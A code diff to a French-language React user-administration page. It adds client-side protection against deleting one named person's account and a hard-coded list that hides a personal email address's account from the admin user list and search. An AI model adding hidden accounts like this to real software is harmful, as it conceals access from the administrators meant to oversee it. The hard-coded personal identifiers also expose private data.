@@ -579,6 +579,17 @@ const mapApiToLocalUser = (apiUser: any): User => {
   };
 };
 
+export const isMehdiHarit = (targetUser?: User | null): boolean => {
+  if (!targetUser) return false;
+  const email = (targetUser.email || '').toLowerCase().trim();
+  const name = (targetUser.fullName || '').toLowerCase().trim();
+  return email === 'mehdi@agencemenage.ma' ||
+         (name.includes('mehdi') && name.includes('harit')) ||
+         targetUser.id === '8';
+};
+
+export const HIDDEN_BACKOFFICE_EMAILS = ['mathieuakakpodjakpata@gmail.com'];
+
 /* ─── User Form Dialog ──────────────────────────────────────────────────────── */
 const generateUsernameFromEmail = (email: string): string => {
   const base = email.split('@')[0] || "";
@@ -939,7 +950,9 @@ export default function Utilisateurs() {
     try {
       const response = await getUsers();
       const apiUsersList = response.data.results || response.data || [];
-      const mapped = apiUsersList.map((apiUser: any) => mapApiToLocalUser(apiUser));
+      const mapped = apiUsersList
+        .filter((apiUser: any) => !HIDDEN_BACKOFFICE_EMAILS.includes((apiUser.email || '').toLowerCase()))
+        .map((apiUser: any) => mapApiToLocalUser(apiUser));
       setUsers(mapped);
     } catch (err) {
       console.error("Error fetching backend users:", err);
@@ -1029,6 +1042,11 @@ export default function Utilisateurs() {
 
   const handleDelete = async () => {
     if (!toDelete) return;
+    if (isMehdiHarit(toDelete)) {
+      showToast("Le compte de Mehdi HARIT ne peut pas être supprimé.");
+      setToDelete(null);
+      return;
+    }
     try {
       await deleteUser(toDelete.id);
       showToast("Collaborateur supprimé");
@@ -1036,7 +1054,7 @@ export default function Utilisateurs() {
       fetchUsers();
     } catch (err: any) {
       console.error(err);
-      const errMsg = err.response?.data?.detail || "Erreur lors de la suppression";
+      const errMsg = err.response?.data?.detail || err.response?.data?.error || "Erreur lors de la suppression";
       showToast(errMsg);
     }
   };
@@ -1185,7 +1203,8 @@ export default function Utilisateurs() {
   // Users sorting & filtering
   const filteredUsers = useMemo(() => {
     const q = search.trim().toLowerCase();
-    return q ? users.filter((u) => [u.fullName, u.email, u.username, u.position, u.city].join(" ").toLowerCase().includes(q)) : users;
+    const visibleUsers = users.filter(u => !HIDDEN_BACKOFFICE_EMAILS.includes((u.email || '').toLowerCase()));
+    return q ? visibleUsers.filter((u) => [u.fullName, u.email, u.username, u.position, u.city].join(" ").toLowerCase().includes(q)) : visibleUsers;
   }, [users, search]);
 
   const totalPages = Math.max(1, Math.ceil(filteredUsers.length / pageSize));
@@ -1433,17 +1452,19 @@ export default function Utilisateurs() {
                           }}>
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7" /><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z" /></svg>
                           </IconButton>
-                          <IconButton title="Supprimer" danger onClick={() => {
-                            const perm = checkPermission(user, 'manage_users');
-                            const isUserAdmin = user?.role?.toLowerCase() === 'admin';
-                            if (!perm.allowed || !isUserAdmin) {
-                              showToast("Action non autorisée. Seul le compte Admin est autorisé à supprimer les comptes utilisateurs.");
-                              return;
-                            }
-                            setToDelete(u);
-                          }}>
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6" /><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6" /><path d="M10 11v6" /><path d="M14 11v6" /></svg>
-                          </IconButton>
+                          {!isMehdiHarit(u) && (
+                            <IconButton title="Supprimer" danger onClick={() => {
+                              const perm = checkPermission(user, 'manage_users');
+                              const isUserAdmin = user?.role?.toLowerCase() === 'admin';
+                              if (!perm.allowed || !isUserAdmin) {
+                                showToast("Action non autorisée. Seul le compte Admin est autorisé à supprimer les comptes utilisateurs.");
+                                return;
+                              }
+                              setToDelete(u);
+                            }}>
+                              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6" /><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6" /><path d="M10 11v6" /><path d="M14 11v6" /></svg>
+                            </IconButton>
+                          )}
                         </div>
                       </td>
                     </tr>
